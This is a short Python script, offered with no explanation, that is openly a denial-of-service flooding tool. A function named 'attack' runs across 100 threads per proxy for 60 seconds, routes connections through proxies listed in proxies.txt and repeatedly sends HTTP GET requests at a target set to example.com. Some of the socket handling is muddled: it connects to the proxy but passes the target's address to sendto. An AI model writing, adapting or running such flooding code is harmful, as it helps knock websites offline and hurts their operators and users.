import socket
import threading
import time

def attack(target, port, proxy, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((proxy, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

def main(target, port, proxies, num_threads, duration):
    threads = []
    for proxy in proxies:
        for _ in range(num_threads):
            thread = threading.Thread(target=attack, args=(target, port, proxy, duration))
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target = 'example.com'
    port = 80
    proxy_file = 'proxies.txt'
    num_threads = 100
    duration = 60  # Duration in seconds

    with open(proxy_file, 'r') as f:
        proxies = f.read().splitlines()

    main(target, port, proxies, num_threads, duration)